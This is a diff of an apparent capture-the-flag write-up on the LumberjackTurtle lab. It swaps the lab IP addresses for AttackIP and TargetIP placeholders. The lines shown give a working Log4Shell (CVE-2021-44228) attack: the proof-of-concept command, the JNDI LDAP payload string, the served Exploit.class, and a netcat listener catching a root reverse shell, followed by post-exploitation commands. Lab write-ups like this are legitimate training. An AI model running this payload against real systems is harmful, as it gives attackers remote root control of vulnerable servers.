@@ -128,14 +128,13 @@ GENERATED WORDS: 4612
 ![image](https://github.com/user-attachments/assets/85a9c80e-6ba8-45de-9a9d-cb2a0f24176a)
 
 <p>Identified IP adress and Port.<br>
-10.10.121.55 37214</p>
 
 <br>
 
 <h3>JNDI Exploit Kit</h3>
 
 ```bash
-root@ip-10-10-14-141:~/LumberjackTurtle/log4j-shell-poc# python3 poc.py --userip 10.10.14.141 --webport 8000 --lport 9001
+:~/LumberjackTurtle/log4j-shell-poc# python3 poc.py --userip AttackIP --webport 8000 --lport 9001
 
 [!] CVE: CVE-2021-44228
 [!] Github repo: https://github.com/kozmer/log4j-shell-poc
@@ -143,7 +142,7 @@ root@ip-10-10-14-141:~/LumberjackTurtle/log4j-shell-poc# python3 poc.py --userip
 [+] Exploit java class created success
 [+] Setting up LDAP server
 
-[+] Send me: ${jndi:ldap://10.10.14.141:1389/a}
+[+] Send me: ${jndi:ldap://AttackIP:1389/a}
 [+] Starting Webserver on port 8000 http://0.0.0.0:8000
 
 Listening on 0.0.0.0:1389
@@ -158,7 +157,7 @@ Listening on 0.0.0.0 9001
 
 
 ```bash
-:~/LumberjackTurtle/log4j-shell-poc# python3 poc.py --userip 10.10.14.141 --webport 8000 --lport 9001
+:~/LumberjackTurtle/log4j-shell-poc# python3 poc.py --userip AttackIP --webport 8000 --lport 9001
 
 [!] CVE: CVE-2021-44228
 [!] Github repo: https://github.com/kozmer/log4j-shell-poc
@@ -170,14 +169,14 @@ Listening on 0.0.0.0 9001
 [+] Starting Webserver on port 8000 http://0.0.0.0:8000
 
 Listening on 0.0.0.0:1389
-Send LDAP reference result for a redirecting to http://10.10.14.141:8000/Exploit.class
-10.10.121.55 - - [04/Jul/2025 02:12:02] "GET /Exploit.class HTTP/1.1" 200 -
+Send LDAP reference result for a redirecting to http://AttackIP:8000/Exploit.class
+10.10.121.55 - - [04/Jul/2025 ...] "GET /Exploit.class HTTP/1.1" 200 -
 ```
 
 ```bash
 :~/LumberjackTurtle/JNDI-Exploit-Kit# rlwrap nc -lnvp 9001
 Listening on 0.0.0.0 9001
-Connection received on 10.10.121.55 59028
+Connection received on TargetIP 59028
 ```
 
 
@@ -188,7 +187,7 @@ Connection received on 10.10.121.55 59028
 ```bash
 :~/LumberjackTurtle/JNDI-Exploit-Kit# rlwrap nc -lnvp 9001
 Listening on 0.0.0.0 9001
-Connection received on 10.10.121.55 59028
+Connection received on TargetIP 59028
 id
 uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
 whoami
@@ -197,10 +196,14 @@ pwd
 /
 ls /root
 which python3
-whoami
-root
+```
+
+```bash
 script /dev/null -c bash
 Script started, file is /dev/null
+```
+
+```bash
 bash-4.4# ls -lah
 ls -lah
 total 68
